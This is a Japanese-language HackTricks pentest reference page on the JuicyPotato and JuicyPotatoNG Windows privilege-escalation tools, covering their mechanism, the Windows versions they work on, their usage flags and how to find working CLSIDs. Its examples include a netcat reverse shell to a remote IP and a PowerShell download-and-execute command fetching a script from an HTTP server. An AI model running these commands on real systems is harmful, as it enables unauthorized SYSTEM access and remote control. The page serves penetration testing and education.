# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato は legacy です。通常、Windows 10 1803 / Windows Server 2016 までの Windows バージョンで動作します。Windows 10 1809 / Server 2019 以降で導入された Microsoft の変更により、元の technique は動作しなくなりました。これらの build 以降では、PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotato などの modern alternatives を検討してください。最新の options と usage については、以下のページを参照してください。

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato（golden privileges の abuse） <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_RottenPotatoNG_ の [_甘い version_](https://github.com/breenmachine/RottenPotatoNG)_であり、少し juice を加えたものです。つまり、**Windows Service Accounts から NT AUTHORITY\SYSTEM への、もう 1 つの Local Privilege Escalation tool** です。_<sup>[[1]](#references)</sup>

#### juicypotato は [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) から download できます

### Compatibility quick notes

- 現在の context に SeImpersonatePrivilege または SeAssignPrimaryTokenPrivilege がある場合、Windows 10 1803 および Windows Server 2016 まで安定して動作します。
- Windows 10 1809 / Windows Server 2019 以降では、Microsoft の hardening により動作しません。これらの build では、上記でリンクされている alternatives を優先してください。

### Summary <a href="#summary" id="summary"></a>

[**juicy-potato Readme より**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) とその [variants](https://github.com/decoder-it/lonelypotato) は、`BITS` [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) が `127.0.0.1:6666` で MiTM listener を持ち、SeImpersonate または SeAssignPrimaryToken privileges がある場合に、privilege escalation chain を利用します。Windows build の review 中に、`BITS` が意図的に無効化され、port `6666` が使用済みになっている setup を発見しました。

私たちは [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) を weaponize することにしました。**Juicy Potato の登場です。**

> theory については、[Rotten Potato - Service Accounts から SYSTEM への Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) を参照し、リンクと references の chain をたどってください。<sup>[[4]](#references)</sup>

`BITS` のほかにも、複数の COM servers を abuse できます。必要な条件は次のとおりです。

1. 現在の user（通常は impersonation privileges を持つ「service user」）が instantiable である
2. `IMarshal` interface を implement している
3. elevated user（SYSTEM、Administrator、…）として実行される

いくつかの test の後、複数の Windows versions で [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) の extensive list を取得して test しました。

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato では、次のことが可能です。<sup>[[1]](#references)</sup>

- **Target CLSID** _必要な CLSID を任意に選択できます。_ [_こちら_](http://ohpe.it/juicy-potato/CLSID/) _で OS ごとに整理された list を確認できます。_
- **COM Listening port** _marshalled hardcoded 6666 の代わりに、任意の COM listening port を定義できます_
- **COM Listening IP address** _server を任意の IP に bind できます_
- **Process creation mode** _impersonated user の privileges に応じて、次から選択できます:_
- `CreateProcessWithToken`（`SeImpersonate` が必要）
- `CreateProcessAsUser`（`SeAssignPrimaryToken` が必要）
- `both`
- **Process to launch** _exploitation に成功した場合に executable または script を launch します_
- **Process Argument** _launch する process の arguments を customize します_
- **RPC Server address** _stealthy approach として、external RPC server に authenticate できます_
- **RPC Server port** _external server に authenticate したい場合や、firewall が port `135` を block している場合に useful です…_
- **TEST mode** _主に testing purposes、つまり CLSIDs の testing に使用します。DCOM を作成し、token の user を print します。testing については_ [_こちら_](http://ohpe.it/juicy-potato/Test/) _を参照してください_

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最終的な考察 <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readme より**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

ユーザーが `SeImpersonate` または `SeAssignPrimaryToken` 権限を持っている場合、あなたは **SYSTEM** です。

これらすべての COM Servers の悪用を防ぐことは、ほぼ不可能です。`DCOMCNFG` を使用してこれらのオブジェクトの権限を変更することを考えるかもしれませんが、幸運を祈ります。これは非常に困難です。

実際の解決策は、`* SERVICE` アカウントで実行される機密性の高いアカウントとアプリケーションを保護することです。`DCOM` を停止すれば、確実にこの exploit を阻止できますが、基盤となる OS に深刻な影響を与える可能性があります。

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG は、以下を組み合わせることで、modern Windows 上に JuicyPotato-style の local privilege escalation を再導入します。<sup>[[2]](#references)</sup>
- 選択した port 上の local RPC server に対する DCOM OXID resolution。これにより、以前の hardcoded な 127.0.0.1:6666 listener を回避します。
- RpcImpersonateClient を必要とせずに、受信した SYSTEM authentication を capture して impersonate する SSPI hook。これにより、SeAssignPrimaryTokenPrivilege だけが存在する場合でも CreateProcessAsUser が有効になります。
- DCOM activation constraints を満たすための tricks（例: PrintNotify / ActiveX Installer Service classes を target にする際に以前必要だった INTERACTIVE-group requirement）。

重要な注意事項（build 間で挙動は変化しています）。<sup>[[2]](#references)</sup>
- 2022 年 9 月: “INTERACTIVE trick” を使用することで、サポート対象の Windows 10/11 および Server targets 上で初期の technique が機能しました。
- 2023 年 1 月、authors からの update: Microsoft はその後、INTERACTIVE trick を block しました。別の CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) により exploitation が復元されますが、authors の post によると Windows 11 / Server 2022 でのみ使用できます。

Basic usage（help にはさらに flags があります）。
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Windows 10 1809 / Server 2019 を対象とし、classic JuicyPotato に patch が適用されている場合は、上部にリンクされている代替手段（RoguePotato、PrintSpoofer、EfsPotato/GodPotato など）を優先してください。NG は build と service の状態によっては状況依存です。

## Examples

注記：[このページ](https://ohpe.it/juicy-potato/CLSID/) にアクセスして、試行する CLSID の一覧を確認してください。

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 新しいCMDを起動（RDP accessがある場合）

![Powershell rev - 新しいCMDを起動（RDP accessがある場合）: 新しいCMDを起動（RDP accessがある場合）](<../../images/image (300).png>)

## CLSIDの問題

JuicyPotatoが使用するデフォルトのCLSIDは**動作しないことが多く**、exploitに失敗します。通常、**動作するCLSID**を見つけるには複数回の試行が必要です。特定のoperating systemで試すCLSIDの一覧を取得するには、次のページを参照してください。

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSIDの確認**

まず、juicypotato.exe以外にもいくつかのexecutableが必要です。

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)をdownloadしてPS sessionにloadし、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)をdownloadしてexecuteします。このscriptによって、テスト可能なCLSIDの一覧が作成されます。

次に、[test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)をdownloadし（CLSID listとjuicypotato executableへのpathを変更して）executeします。すべてのCLSIDの試行が開始され、**port numberが変化した場合、そのCLSIDが動作したことを意味します**。

動作するCLSIDを**parameter -cで確認**します。

## References

- [1] [Juicy Potato README（ohpe/juicy-potato）](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [JuicyPotatoに再度チャンスを与える：JuicyPotatoNG（decoder.it）](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato project page（ohpe.it）](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Service AccountsからSYSTEMへのPrivilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
